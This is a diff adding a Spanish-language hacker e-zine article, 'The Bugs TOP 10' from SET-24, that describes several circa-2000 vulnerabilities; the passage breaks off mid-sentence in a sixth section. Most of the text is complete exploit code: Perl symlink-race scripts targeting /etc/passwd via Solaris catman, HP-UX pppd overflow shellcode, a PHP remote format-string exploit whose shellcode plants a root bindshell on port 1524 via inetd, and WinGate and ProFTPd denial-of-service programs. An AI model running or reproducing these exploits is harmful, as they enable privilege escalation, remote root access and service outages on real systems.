@@ -1,0 +1,1501 @@
+-[ 0x0A ]--------------------------------------------------------------------
+-[ The Bugs TOP 10 ]---------------------------------------------------------
+-[ by Kriptik / MORTIIS ]---------------------------------------------SET-24-
+
+
+
+                                The BUGS TOP 10
+                               -----------------
+
+Una vez mas, os presentamos unos cuantos bugs aparecidos ultimamente, y esta
+vez lo de ultimamente lo hemos procurado cumplir a rajatabla, por esto mismo
+las malas lenguas (y no tan malas) dicen q SET se ha retrasado una semanita
+:(. Lo siento mucho, pero no queria volver a oir eso de q los bugs son de
+cuando Internet era DARPAnet, y de repente se nos echaron los examenes
+encima, SET lista mientras lidiabamos con los campos de una guia de ondas, o
+los Lagrangianos y su p**a madre... vamos, sirva esto mas como disculpa q
+como justificacion, y disfruten vuesas mercedes de los bugs q presentamos a
+continuacion, simples, efectivos, alguno curioso... y las explicaciones...
+pues en fin, vosotros juzgareis, pero al menos unas peque~as pinceladas para
+que sepais de que va el baile ;)
+
+Si os encontrais que la mayor parte de ellos ya han sido parcheados en los
+sistemas de la red... no os apeneis... alegraros!!, por que entonces quiza
+es que la gente al fin se ha tomado la seguridad en serio. ;)
+
+Sin mas dilacion, aqui teneis esta nueva entrega:
+
+
+-( 0x01 )-
+
+Tema     : Solaris 2.7/2.8 catman temp file vulnerability
+Para     : "catman" localmente en Solaris.
+Patch    : www.sun.com seguramente tenga ya la solucion.
+Fecha    : 18 de Diciembre 2000
+Creditos : Larry W. Cashdollar (Vapid Labs)
+
+Descripcion:
+
+Un tipico fallo de Race-conditions, en el que mediante la creacion de un
+sym-link antes que el propio catman genere un archivo auxiliar podremos
+reescribir archivos con los permisos que corra catman (usualmente root).
+
+Catman, crea un archivo temporal en /tmp con nombre/tmp/sman_pid_de_catman,
+de modo q echandole un ojo a los PIDs de los procesos actuales, podremos
+crear facilmente este link o varios para probar antes de q catman lo genere.
+
+A continuacion van dos exploits, uno que genera varios symlinks entre el
+ultimo pid actual y mil mas, para intentar que caiga entre estos el de
+catman cuando el root lo lance, y otro algo mas arriesgado q una vez detecta
+la aparicion de catman, intenta adelantarse a este en la creacion del
+symlink donde catman creara su archivo temporal (pura carrera!!) ;).
+
+Referencias:
+
+        Sun Microsystems.
+        http://www.sun.com
+
+        Vapid Labs.
+	http://vapid.betteros.org
+	Email: Larry W. Cashdollar <lwc@vapid.betteros.org>
+
+Exploits:
+
+#!/usr/local/bin/perl -w
+# The problem is catman creates files in /tmp insecurly. They are based on the
+# PID of the catman process,  catman will happily clobber any files that are
+# symlinked to that file.
+# The idea of this script is to create a block of symlinks to the target file
+# with the current PID  as a starting point.  Depending on what load your
+# system has this creates 1000 files in /tmp as sman_$currentpid + 1000.
+# The drawback is you would have to know around when root would be executing
+# catman.
+# A better solution would be to monitor for the catman process and create the
+# link before catman creates the file.  I think this is a really small window
+# however. This worked on a patched Solaris 2.7 box (August 2000 patch
+# cluster)
+# SunOS rootabega 5.7 Generic_106541-12 sun4u sparc SUNW,Ultra-1
+# lwc@vapid.betteros.org   11/21/2000   Vapid Labs.
+# http://vapid.betteros.org
+
+$clobber = "/etc/passwd"; #file to clobber
+$X=getpgrp();
+$Xc=$X; #Constant
+$Y=$X+1000;#Constant
+
+while($X < $Y) {
+
+print "Linking /tmp/sman_$X to $clobber :";
+# Change $clobber to what you want to clobber.
+if (symlink ($clobber, "/tmp/sman_$X")) {
+	print "Sucess\n";
+}
+ 	else { print "failed, Busy system?\n";}
+$X=$X+1;
+}
+
+
+#Watch /tmp and see if catman is executed in time.
+
+while(1)  {
+
+$list = "/usr/bin/ls -l /tmp | grep sman|grep root |";
+
+open (list,$list) or "die cant open ls...\n";
+
+while(<list>) {
+	@args = split "_",$_;
+	chop ($args[1]);
+    if ($args[1] >= $Xc && $args[1] <= $Y){
+		print "Looks like pid $args[1] is the winner\n cleaning....\n";
+		`/usr/bin/rm -f /tmp/sman*`;
+		exit(1);
+    }
+  }
+}
+
+
+
+#!/usr/local/bin/perl -w
+# The problem is catman creates files in /tmp insecurly. They are based on the PID of the catman
+# process,  catman will happily clobber any files that are symlinked to that file.
+# The idea of this script is to watch the process list for the catman process,
+# get the pid and Create a symlink in /tmp to our file to be
+# clobbered.  This exploit depends on system speed and process load.
+# This worked on a patched Solaris 2.7 box (August 2000 patch cluster)
+# SunOS rootabega 5.7 Generic_106541-12 sun4u sparc SUNW,Ultra-1
+# lwc@vapid.betteros.org   11/21/2000   Vapid Labs.
+# http://vapid.betteros.org
+
+
+
+$clobber = "/etc/pass";
+while(1) {
+open ps,"ps -ef | grep -v grep |grep -v PID |";
+
+while(<ps>) {
+@args = split " ", $_;
+
+if (/catman/) {
+	print "Symlinking sman_$args[1] to  $clobber\n";
+	symlink($clobber,"/tmp/sman_$args[1]");
+	exit(1);
+   }
+ }
+
+}
+
+
+-( 0x02 )-
+
+Tema     : Buffer Overflow (local) en PPPD
+Para     : HP-UX
+Patch    : humm... iba a decir q pasarse a SPARC, pero quiza no sea una gran
+	   idea. Busca un patch en la web de HP.
+Fecha    : Diciembre 2000
+Creditos : K2
+
+Descripcion:
+
+Simplemente eso... un buffer_overflow en los parametros que se le pasan
+al daemon de PPP que trae HP-UX.
+
+Exploit:
+
+
+/*      Copyright (c) 2000 ADM                                  */
+/*      All Rights Reserved                                     */
+/*      THIS IS UNPUBLISHED PROPRIETARY SOURCE CODE OF ADM      */
+/*      The copyright notice above does not evidence any        */
+/*      actual or intended publication of such source code.     */
+/*                                                              */
+/*      Title:        HP-UX pppd                                */
+/*      Tested under: HP-UX 11.0                                */
+/*      By:           K2                                        */
+/*      Use:          gcc -o pppd hp-pppd.c ; ./pppd            */
+/*                    (more hp to come :)                       */
+/*                                                              */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/types.h>
+#include <unistd.h>
+
+#define BUF_LENGTH 22000
+#define STACK_OFFSET 8042
+#define EXTRA 3000
+#define HPPA_NOP 0x3902800b /* weirdo nop */
+
+u_char hppa_shellcode[] =
+"\xe8\x3f\x1f\xfd\x08\x21\x02\x80\x34\x02\x01\x02\x08\x41\x04\x02\x60\x40"
+"\x01\x62\xb4\x5a\x01\x54\x0b\x39\x02\x99\x0b\x18\x02\x98\x34\x16\x04\xbe"
+"\x20\x20\x08\x01\xe4\x20\xe0\x08\x96\xd6\x05\x34\xde\xad\xca\xfe/bin/sh"
+"\xff\xff";
+
+u_long get_sp(void)
+{
+   __asm__("copy %sp,%ret0 \n");
+}
+
+int main(int argc, char *argv[])
+{
+   char buf[BUF_LENGTH + 8];
+   unsigned long targ_addr;
+   u_long *long_p;
+   u_char *char_p;
+   int i, code_length = strlen(hppa_shellcode),dso=STACK_OFFSET,xtra=EXTRA;
+
+   if(argc > 1) dso+=atoi(argv[1]);
+   if(argc > 2) xtra+=atoi(argv[2]);
+
+   long_p = (u_long *) buf;
+
+   for (i = 0; i < (BUF_LENGTH - code_length - xtra) / sizeof(u_long); i++)
+     *long_p++ = HPPA_NOP;
+
+   char_p = (u_char *) long_p;
+
+   char_p--;  /* weirdness alighnment issue */
+
+   for (i = 0; i < code_length; i++)
+     *char_p++ = hppa_shellcode[i];
+
+   targ_addr = get_sp() - dso;
+
+   for (i = 0; i < xtra /4; i++)
+   {
+      *char_p++ =(targ_addr>>24)&255;
+      *char_p++ =(targ_addr>>16)&255;
+      *char_p++ =(targ_addr>>8)&255;
+      *char_p++ =(targ_addr)&255;
+   }
+
+   printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",targ_addr,strlen(buf)
+,xtra,dso);
+
+   execl("/usr/bin/pppd","pppd", buf,(char *) 0);
+   perror("execl failed");
+   return(-1);
+}
+
+
+
+-( 0x03 )-
+
+Tema     : Buffer Overflow (remoto) en APACHE/PHP 3.0.16/4.0.2
+Para     : PHP sobre: Slackware Linux 7.0 - i386/Apache 1.3.12/PHP 3.0.16
+Patch    : Actualizarse la version de PHP ;)
+Fecha    : Diciembre 2000
+Creditos : Field Marshal Count August [...]
+
+Descripcion:
+
+De nuevo un fallo de seguridad en los servidores APACHE corriendo PHP.
+Lo que a continuacion teneis es el exploit para un buffer_overflow, format
+overflow en palabras del autor, muy currado. Por cierto, si pensais usarlo
+debereis tener Netcat o algo similar, y mirar las instrucciones ;).
+Este exploit insertara una linea en el inetd.conf de modo que en el puerto
+1524 (ingreslock) os espere una shell de root ;).
+
+Exploit:
+
+/*
+ * PHP 3.0.16/4.0.2 remote format overflow exploit.
+ * Copyright (c) 2000
+ * Field Marshal Count August Anton Wilhelm Neithardt von Gneisenau
+ * gneisenau@berlin.com
+ * my regards to sheib and darkx
+ * All rights reserved
+ * Pascal Boucheraine's paper was enlightening
+ * THERE IS NO IMPLIED OR EXPRESS WARRANTY FOR THIS CODE.
+ * YOU ARE RESPONSIBLE FOR YOUR OWN ACTIONS AND I CANNOT BE HELD RESPONSIBLE
+ * FOR THE CONSEQUENCES
+ * Usage:
+ * phpxpl -sx -uwww.victim.com/some.php3 | nc www.victim.com 80
+ */
+
+
+/*
+ * We just printf the shellcode and stuff and nc it to the target
+ */
+#include <sys/types.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+
+// this exploit does not like 0x0a = '\n' in the shellcode. also the NULL at
+// the end of the shellcode will be removed as the shellcode is probably
+// strcatted into the buffer. so do it again in the shellcode.
+/*
+ * This shellcode is for Linux/x86.
+ * This shellcode spawns a shell and runs the command
+ * echo 'ingreslock stream tcp nowait root /bin/bash bash -i'>/tmp/.inetd.conf; /usr/sbin/inetd /tmp/.inetd.conf
+ */
+char shellcode[] = {
+0xeb,0x41,
+0x5e,
+0x31,0xc0,
+0x31,0xdb,
+0xb0,0xa0,
+0x89,0x34,0x06,
+0x8d,0x4e,0x07,
+0x88,0x19,
+0x41,
+0x41,
+0xb0,0xa4,
+0x89,0x0c,0x06,
+0x8d,0x4e,0x0b,
+0x88,0x19,
+0x41,
+0xb0,0xa8,
+0x89,0x0c,0x06,
+0x8d,0x4e,0x7f,
+0x88,0x19,
+0x31,0xd2,
+0xb0,0xac,
+0x89,0x14,0x06,
+0x89,0xf3,
+0x89,0xf1,
+0xb0,0xa0,
+0x01,0xc1,
+0xb0,0x0b,
+0xcd,0x80,
+0x31,0xc0,
+0xb0,0x01,
+0x31,0xdb,
+0xcd,0x80,
+0xe8,0xba,0xff,0xff,0xff,
+0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0xff,0xff, /* the string "/bin/sh" */
+0x2d,0x63,0xff,				/* the string "-c" */
+0x2f,0x62,0x69,0x6e,0x2f,0x65,0x63,0x68,0x6f,0x20,0x27,0x69,
+0x6e,0x67,0x72,0x65,0x73,0x6c,0x6f,0x63,0x6b,0x20,0x73,0x74,
+0x72,0x65,0x61,0x6d,0x20,0x74,0x63,0x70,0x20,0x6e,0x6f,0x77,
+0x61,0x69,0x74,0x20,0x72,0x6f,0x6f,0x74,0x20,0x2f,0x62,0x69,
+0x6e,0x2f,0x62,0x61,0x73,0x68,0x20,0x62,0x61,0x73,0x68,0x20,
+0x20,0x2d,0x69,0x27,0x3e,0x2f,0x74,0x6d,0x70,0x2f,0x2e,0x69,
+0x6e,0x65,0x74,0x64,0x2e,0x63,0x6f,0x6e,0x66,0x3b,0x20,0x2f,
+0x75,0x73,0x72,0x2f,0x73,0x62,0x69,0x6e,0x2f,0x69,0x6e,0x65,
+0x74,0x64,0x20,0x2f,0x74,0x6d,0x70,0x2f,0x2e,0x69,0x6e,0x65,
+0x74,0x64,0x2e,0x63,0x6f,0x6e,0x66,0x00,
+};
+
+#define NOP 0x90
+
+
+/*
+ * the PHP3 error buffer will already contain PHP 3 Warning: The Content-Type
+ * string was "multipart/form-data. This is 66 bytes long. we send 2 spaces
+ * for padding the addresses we embed in our attack buffer on word boundary
+ */
+#define PHP3_WARNING 68
+#define BUF_LEN 1024
+
+struct system_type {
+	char *name;
+	unsigned int nop;
+	char *shellcode;
+	int	shellcode_len;
+	int	offset;		/* the number of pops we need to get to our own data*/
+	int	already_written;/* number of bytes written by printf by the time we
+				 reach the our embedded data */
+	unsigned int	eip_address; /* address where shellcode_address must be put */
+	unsigned int	shellcode_address; /* address of shellcode in memory */
+};
+
+struct system_type systems[] = {
+	{
+		"Slackware Linux 7.0 - i386/Apache 1.3.12/PHP 3.0.16 (static module)",
+		0x90,
+		shellcode,
+		270,	/* not exact but we got lots of space ;) */
+		27,
+		0x152,
+		0xbfff9c30,
+		0xbfff962c,
+	},
+	// somebody find these and fill it in please. should be
+	// straightforward.
+	{
+		"Red Hat 6.0 - i386/Apache 1.3.13/PHP 3.0.16 (static module)",
+		(unsigned int)NULL,
+		NULL,
+		(int)NULL,
+		(int)NULL,
+		(int)NULL,
+		(unsigned int)NULL,
+		(unsigned int)NULL,
+	},
+	{
+		NULL,
+		(unsigned int)NULL,
+		NULL,
+		(int)NULL,
+		(int)NULL,
+		(int)NULL,
+		(unsigned int)NULL,
+		(unsigned int)NULL,
+	},
+};
+
+void 	usage (void);
+void 	parse_url (char *, char *);
+void 	prepare_attack_buffer (char *, struct system_type *, char *);
+int	calculate_precision (unsigned int, int);
+
+int
+main (int argc, char *argv[])
+{
+	char 	attack_buffer[2000];// we construct the shellcode and stuff here
+					// the target is 1024 bytes long
+	struct system_type *sysptr;
+	char  *url;	// i hope these things dont get bigger than this
+	char  target[2048];	// target will contain only the FQDN
+	unsigned int eip_address = 0, shellcode_address = 0;
+	int	ctr = 0;
+	int	nop_count;
+	char  *walk;
+	int	arg;
+
+	// at least expect a system type and url from the command line
+	if (argc < 3)
+		usage ();
+
+	// parse arguments
+	while ((arg = getopt (argc, argv, "s:u:e:h:")) != -1){
+		switch (arg){
+			case 'h':
+				sscanf (optarg, "%x", &shellcode_address);
+				break;
+			case 'e':
+				sscanf (optarg, "%x", &eip_address);
+				break;
+			case 's':
+				sysptr = &systems[atoi (optarg)];
+				break;
+			case 'u':
+				url = optarg;
+				parse_url (url, target);
+				break;
+			case '?':
+			default :
+						usage ();
+		}
+	}
+
+	if (eip_address)
+		sysptr->eip_address = eip_address;
+	if (shellcode_address)
+		sysptr->shellcode_address = shellcode_address;
+	prepare_attack_buffer (attack_buffer, sysptr, url);
+
+	// as of now write it out to stdout. later write it to a socket
+	write (STDOUT_FILENO, attack_buffer, sizeof (attack_buffer));
+}
+
+void
+prepare_attack_buffer (char *attack_buffer, struct system_type *system,
+								char *url)
+{
+	int	dest_buffer_written;	/* we keep track of how much
+			 bytes will be written in the destination buffer */
+	int 	ctr;
+	char	*address;
+	char	buf[25];	// temp buffer for %xd%n%xd%n%xd%n%xd%n
+				// where x is precision
+	int 	p1,p2,p3,p4;
+	int	nop_count;
+
+	bzero (attack_buffer, 2000);
+	sprintf (attack_buffer, "POST http://%s HTTP/1.0\nConnection: close\nUser-Agent: tirpitz\nContent-Type: multipart/form-data   ", url);
+	// mark strlen here. whatever we write after here appears in the buffer
+	dest_buffer_written = strlen (attack_buffer);
+
+	strcat (attack_buffer, "\x11\x11\x11\x11");
+	address = (char *)&system->eip_address;
+	strncat (attack_buffer, address, 4);
+	strcat (attack_buffer, "\x11\x11\x11\x11");
+	system->eip_address++;
+	address = (char *)&system->eip_address;
+	strncat (attack_buffer, address, 4);
+	strcat (attack_buffer, "\x11\x11\x11\x11");
+	system->eip_address++;
+	address = (char *)&system->eip_address;
+	strncat (attack_buffer, address, 4);
+	strcat (attack_buffer, "\x11\x11\x11\x11");
+	system->eip_address++;
+	address = (char *)&system->eip_address;
+	strncat (attack_buffer, address, 4);
+
+	/*
+	 * we need to add %x corresponding to the number of pops we need to reach
+	 * our embedded addresses we defined above
+	 */
+
+	for (; system->offset; system->offset--)
+		strcat (attack_buffer, "%x ");
+
+	p1 = calculate_precision ((system->shellcode_address & 0x000000ff), system->already_written);
+	p2 = calculate_precision ((system->shellcode_address & 0x0000ff00) >> 8, system->already_written);
+	p3 = calculate_precision ((system->shellcode_address & 0x00ff0000) >> 16, system->already_written);
+	p4 = calculate_precision ((system->shellcode_address & 0xff000000) >> 24, system->already_written);
+	sprintf (buf, "%%%dd%%n%%%dd%%n%%%dd%%n%%%dd%%n", p1, p2, p3, p4);
+	strcat (attack_buffer, buf);
+
+	ctr = strlen (attack_buffer);
+	dest_buffer_written = ctr - dest_buffer_written;
+	dest_buffer_written += PHP3_WARNING; // dest_buffer_written now contains the number of bytes the PHP_WARNING and then the 8 4 byte values and then the %x to pop off the stack
+	attack_buffer += ctr;
+	nop_count = BUF_LEN - dest_buffer_written - system->shellcode_len;
+	memset (attack_buffer, NOP, nop_count);
+	/*
+	 * Add our shellcode at last
+	 */
+	attack_buffer += nop_count;
+	strcat (attack_buffer, shellcode);
+	strcat (attack_buffer, "\n");
+	strcat (attack_buffer, "Content-Length: 1337\n\n");
+}
+
+void
+usage (void)
+{
+	int 	ctr;
+
+	fprintf (stderr, "                                 Apache/PHP xploit\n");
+	fprintf (stderr, "        Field Marshal Count August Anton Wilhelm Neithardt von Gneisenau\n");
+	fprintf (stderr, "                                 for the r00tcrew\n");
+	fprintf (stderr, "                                All rights reserved\n");
+	fprintf (stderr, "\nUsage:\n");
+	fprintf (stderr, "phpxpl -u url -s systype [ -e eip address ] [ -h shellcode address ]\n\n");
+	fprintf (stderr, "url: the complete url including FQDN and script on the server\n");
+	fprintf (stderr, "      www.victim.com/info.php3\n");
+	fprintf (stderr, "available systypes:\n");
+
+	for (ctr = 0; systems[ctr].name; ctr++)
+		fprintf (stderr, "%d. %s\n", ctr, systems[ctr].name);
+	fprintf (stderr, "eip address: the address which the xploit overwrites with buffer address (specify thus 0xbfff9c30) \n");
+	fprintf (stderr, "shellcode address: the address which points to the NOPs (specify thus 0xbfff962c)\n");
+	fprintf (stderr, "\n");
+	exit (1);
+}
+
+void
+parse_url (char *url, char *target)
+{
+	char *ptr;
+
+	strcpy (target, url);
+	if (!(ptr = index (target, '/'))){
+		fprintf (stderr, "invalid url. specify the script name on the target server too\n");
+		exit (1);
+	}
+	*ptr = '\0';
+}
+
+/*
+ * addr_byte contains the byte we need to write out. for example: 2c in
+ * 0xbfff962c, then 96, ff and bf.
+ */
+int
+calculate_precision (unsigned int addr_byte, int already_written_init)
+{
+	static int already_written = 0;
+	int	tmp;
+
+	if (!already_written)
+		already_written = already_written_init;
+
+	while (addr_byte < already_written)
+		addr_byte += 0x100;
+
+	tmp = addr_byte - already_written;
+	already_written = addr_byte;
+	return tmp;
+}
+
+
+
+-( 0x04 )-
+
+Tema     : DOS a WinGate
+Para     : humm... WinGate ??
+Patch    : supongo que con no usar WinGate, o al menos no dejar acceso a to
+	   dios... recomendado restringir el acceso con un firewall por
+	   ejemplo ;)
+Fecha    : Diciembre 2000M
+Creditos : god- 3/dec/y2k
+
+
+Descripcion:
+
+Simple y efectivo. Se crean muchas conexiones contra el servidor WinGate,
+y se le envian por cada conexion un gran buffer marcando los paquetes con el
+flag de MSG_OOB, de modo q las conexiones se mantengan, y no acepte mas. De
+modo q un siguiente intento de login de como error: 'out of buffers'. Como
+parece mas o menos obvio este ataque deja al WinGate TOTALMENTE inoperativo.
+Vamos un DOS en toda regla! ;).
+
+Exploit:
+
+/* god- 3/dec/y2k */
+
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <netdb.h>
+#include <errno.h>
+
+char usage(char *);
+unsigned long elookup(const char *);
+
+void sighan(int sig_num) {
+   printf("Expected SIGPIPE... got it!\n");
+   printf("bailing out!\n");
+   exit(0);
+}
+
+int main(int argc, char *argv[]) {
+   int fd, fd2;
+   int fd3[100];
+   int i = 0;
+   struct sockaddr_in sin;
+   /* blah blah large and shitty buffer */
+   char buffer[40000] = "\r\n\n";
+
+   char *einval = "argument";
+   char *refu = "refused";
+   if(argc != 2) usage(argv[0]);
+   signal(SIGPIPE, sighan);
+   for(i = 0; i < 100;i++) {
+      if((fd3[i] = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
+         perror("socket");
+         exit(0);
+      }
+   }
+   memset(&sin, 0, sizeof(sin));
+   sin.sin_port = htons(1080);
+   sin.sin_family = AF_INET;
+   if((sin.sin_addr.s_addr = elookup(argv[1])) == -1) return -1;
+
+   printf("WinGate Remote DoS by god-@EFnet!\n");
+   printf("Crashing wingate ports...\n");
+
+   if((fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
+      perror("socket");
+      exit(0);
+   }
+   if((fd2 = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
+      perror("socket");
+      exit(0);
+   }
+   for(i = 0; i < 100 ; i++) {
+      if(connect(fd3[i], (struct sockaddr*)&sin, sizeof(sin)) == -1) {
+         if(strstr(sys_errlist[errno], refu) != NULL) {
+            sin.sin_port = htons(23);
+         }
+      }
+      if(send(fd3[i], buffer, strlen(buffer), MSG_OOB) == -1) {
+         if(strstr(sys_errlist[errno], einval) != NULL) {
+            printf("This WinGate DoS program cannot run on this box =[\n");
+            exit(0);
+         }
+         else { perror("socket"); exit(0); }
+      }
+   }
+   /* NOT REACHED ( BECAUSE OF SIGPIPE ), BUT STILL HERE. */
+
+   printf("checking if port is open...");
+   shutdown(2, fd);
+   if(connect(fd2, (struct sockaddr*)&sin, sizeof(sin)) == -1) {
+      printf("port got crashed! mauyauhahu!\n");
+      exit(0);
+   }
+   else {
+      printf("dos failed =[\n");
+   }
+   return 0;
+}
+
+char usage(char *fname) {
+   printf("WinGate Remote DoS attack by god-@EFNet!\n");
+   printf("Usage: %s <host>\n", fname);
+   exit(0);
+}
+unsigned long elookup (const char *host){
+
+   struct in_addr in;
+   struct hostent *hp;
+   if ((in.s_addr = inet_addr(host)) == -1){
+      if ((hp = gethostbyname(host)) == (struct hostent *)NULL)
+        return -1;
+      memcpy (&in.s_addr, hp->h_addr, hp->h_length);
+   }
+   return in.s_addr;
+}
+
+
+
+-( 0x05 )-
+
+Tema     : DOS a ProFTPd
+Para     : 
+Patch    : Actualizarse... por q esta visto que no se puede recomendar ya
+	   ningun daemon de FTP... o si??.. ;)
+Fecha    : Diciembre 2000M
+Creditos : Jet-Li -= The Wushu Master =- ;P
+
+
+Descripcion:
+
+Bien, este es un bug descubierto por un amiguete de nuestras tierras, para q
+veais q Espa~a tambien va pegando fuerte. El amigo Jet-Li ha descubierto un
+problema de DOS en ProFTPd. Lo que trata de hacer es dejar sin memoria
+disponible a la victima mediante el envio de muchos comandos SIZE o bien de
+los comandos USER de ftp. El exploit escrito por Jet-Li, nos permite
+seleccionar entre estas dos versiones del DOS, eso si... necesitareis tener
+un interprete de Java a mano ;).
+
+
+Exploit:
+
+
+/*      ProFTPd DoS version 1.1
+
+        Remote DoS in proFTPd
+
+
+        Code by: JeT-Li         -The Wushu Master-      jet_li_man@yahoo.com
+
+
+        Recently I posted a remote DoS for ProFTPd based in the multiple use
+
+        of the SIZE command in order to crash the system. Now and thanks to
+
+        the information provided by Wojciech Purczynski I have coded a
+
+        program that not only use the SIZE command but also the USER command.
+
+        So at this time access to the ftp is not necessary to manage a DoS
+
+        attack. The concept is equal to the last exploit one, but using
+
+        multiple USER instead of SIZE.
+
+
+
+        You don't have to give arguments when you execute the program, it
+
+        will request you these.
+
+
+
+        Greets: _kiss_ (the real fucker ;-P); gordoc (no comment, the most
+
+        hax man in the w0rld); Perip|o (tibetan mantras for u! ;-P); and all
+
+        the ppl of #hackers (not able for cardiac XD).
+
+
+
+        Vulnerable systems:
+
+        ProFTPd 1.2.0rc1        (Tested)
+
+        ProFTPd 1.2.0rc2        (Tested)
+
+        And maybe others(1.2.0preX); I have no test this, but I'm sure you
+
+        can do it for me ;-)
+
+        NOTE: 1.2.0pre10 is seems to be vulnerable according to the words of
+
+        Wojciech Purczynski ... */
+
+
+
+import java.net.*;
+
+import java.io.*;
+
+
+
+class TCPconnection {
+
+
+
+    public TCPconnection (String hostname, int portnumber) throws Exception {
+
+    Socket s = doaSocket(hostname, portnumber);
+
+    br = new BufferedReader (new InputStreamReader (s.getInputStream()));
+
+    ps = new PrintStream (s.getOutputStream());
+
+    }
+
+
+
+    public String readLine() throws Exception {
+
+    String s;
+
+    try {       s = br.readLine();      }
+
+    catch (IOException ioe) {
+
+    System.out.println("TCP Error ... it's a little hax0r exception ;-)");
+
+    throw new Exception ("\nInput Error: I/O Error");
+
+        }
+
+    return s;
+
+    }
+
+
+
+    public void println(String s) {
+
+        ps.println(s);
+
+    }
+
+
+
+    private Socket doaSocket(String hostname, int portnumber) throws Exception
+{
+
+    Socket s = null;
+
+    int attempts = 0;
+
+    while (s == null && attempts<maxattempts) {
+
+    try {       s = new Socket(hostname, portnumber);   }
+
+    catch (UnknownHostException uhe) {
+
+    System.err.println("It was no posible to establish the TCP connection.\n" +
+ "Reason: unknown hostname " + hostname + ". Here is the Exception:");
+
+    throw new Exception("\nConnection Error: " + "unknown hostname");
+
+    }
+
+    catch (IOException ioe) {
+
+    System.err.println("The connection was not accomplished due to an I/O Error
+: trying it again ...");
+
+    }
+
+    attempts++;
+
+    }
+
+    if (s == null) throw new IOException("\nThe connection was not accomplished
+ due to an I/O Error: trying it again ...");
+
+    else return s; }
+
+    private final int maxattempts = 5;
+
+    private BufferedReader br;
+
+    private PrintStream ps;
+
+
+
+    }
+
+
+
+class proftpDoS {
+
+
+
+    public static void main(String[] arg) throws Exception {
+
+    InputStreamReader isr;
+
+    BufferedReader tcld;
+
+    String hostnamez, username, password, file, s1, option, option1;
+
+    int i, j, k, m;
+
+    isr = new InputStreamReader(System.in);
+
+    tcld = new BufferedReader(isr);
+
+    System.out.println("ProFTPd DoS version 1.1 by JeT-Li -The Wushu Master-");
+
+    System.out.println("Code in an attempt to solve Fermat Last's Theoreme");
+
+    System.out.println("Please choose the type of attack you wanna use; insert
+only the NUMBER, i.e.: 1");
+
+    System.out.println("1) Memory leakage using USER command");
+
+    System.out.println("2) Memory leakage using SIZE command");
+
+    System.out.print("Option: ");
+
+    option = tcld.readLine();
+
+    m = Integer.parseInt(option);
+
+    while (!(m==1 || m==2)) {
+
+    System.out.print("Option not valid, please try again: ");
+
+    option = tcld.readLine();
+
+    m = Integer.parseInt(option); }
+
+    if (m==1) {
+
+    hostnamez = "";
+
+    while (hostnamez.length()==0) {
+
+    System.out.print("Please enter the hostname/IP: ");
+
+    hostnamez = tcld.readLine(); }
+
+    System.out.println("Choose one of this options; insert only the NUMBER, i.e
+.: 1");
+
+    System.out.println("1) Request 15000 size's to the server (it may be enough
+)");
+
+    System.out.println("2) \"No pain no gain\" (pseudo-eternal requests, ey it
+may be harm ;-P)");
+
+    System.out.print("Option: ");
+
+    option1 = tcld.readLine();
+
+    k = Integer.parseInt(option1);
+
+    while (!(k==1 || k==2)) {
+
+    System.out.print("Option not valid, please try again: ");
+
+    option1 = tcld.readLine();
+
+    k = Integer.parseInt(option1); }
+
+    TCPconnection tc = new TCPconnection(hostnamez, 21);
+
+        if (k==1) {
+
+        for(i=0;i<15000;i++)
+
+        tc.println("user themosthax0ruserthatthisw0rldhaseverseen" + i); }
+
+    else if (k==2) {
+
+    for(i=1;i<100;i++)
+
+        for(j=2;j<((int)Math.pow(j,i ));j++)
+
+            tc.println("user themosthax0ruserthatthisw0rldhaseverseen" + j); }
+
+    tc.println("quit");
+
+    s1 = tc.readLine();
+
+    while (s1!=null) {
+
+    s1 = tc.readLine();
+
+    System.out.println("Attack completed ... as one of my friends says:");
+
+    System.out.println("Hack just r0cks ;-)");
+
+    }
+
+    }
+
+    else if (m==2) {
+
+    hostnamez = "";
+
+    while (hostnamez.length()==0) {
+
+    System.out.print("Please enter the hostname/IP: ");
+
+    hostnamez = tcld.readLine(); }
+
+    username = "";
+
+    while (username.length()==0) {
+
+    System.out.print("Enter the username: ");
+
+    username = tcld.readLine(); }
+
+    password = "";
+
+    while (password.length()==0) {
+
+    System.out.print("Enter the password for that username: ");
+
+    password = tcld.readLine(); }
+
+    file = "";
+
+    while (file.length()==0) {
+
+    System.out.print("Enter a valid filename on the FTP \n(with correct path of
+ course ;-): ");
+
+    file = tcld.readLine(); }
+
+    System.out.println("Choose one of this options; insert only the NUMBER, i.e
+.: 1");
+
+    System.out.println("1) Request 15000 size's to the server (it may be enough
+)");
+
+    System.out.println("2) \"No pain no gain\" (pseudo-eternal requests, ey it
+may be harm ;-P)");
+
+    System.out.print("Option: ");
+
+    option1 = tcld.readLine();
+
+    k = Integer.parseInt(option1);
+
+    while (!(k==1 || k==2)) {
+
+    System.out.print("Option not valid, please try again: ");
+
+    option1 = tcld.readLine();
+
+    k = Integer.parseInt(option1); }
+
+    TCPconnection tc = new TCPconnection(hostnamez, 21);
+
+    tc.println("user " + username);
+
+    tc.println("pass " + password);
+
+    if (k==1) {
+
+        for(i=0;i<10000;i++)
+
+        tc.println("size " + file); }
+
+    else if (k==2) {
+
+    for(i=1;i<100;i++)
+
+        for(j=2;j<((int)Math.pow(j,i ));j++)
+
+            tc.println("size " + file); }
+
+    tc.println("quit");
+
+    s1 = tc.readLine();
+
+    while (s1!=null) {
+
+    s1 = tc.readLine();
+
+    System.out.println("Attack completed ... as one of my friends says:");
+
+    System.out.println("Hack just r0cks ;-)");
+
+    }
+
+    }
+
+    }
+
+}
+
+
+
+
+-( 0x06 )-
+
+Tema     : NAPTHA DoS
+Para     : Sistemas Operativos en general
+Patch    : Rezar y configurar bien el servidor
+Creditos : advisory+naptha@razor.bindview.com
+
+Descripcion:
+
+	Que es esto de NAPTHA DoS os preguntareis. Pues son un grupo
+determinado de DoS que se caracterizan por fallos de programacion en
+las pilas TCP/IP y en los propios demonios, a la hora de manejar y
+mantener las conexiones abiertas.
+	Supongo que ya os quedara un poco mas claro, pero si todavia
+estais perdidos, simplemente pensar que pasaria si abris 400
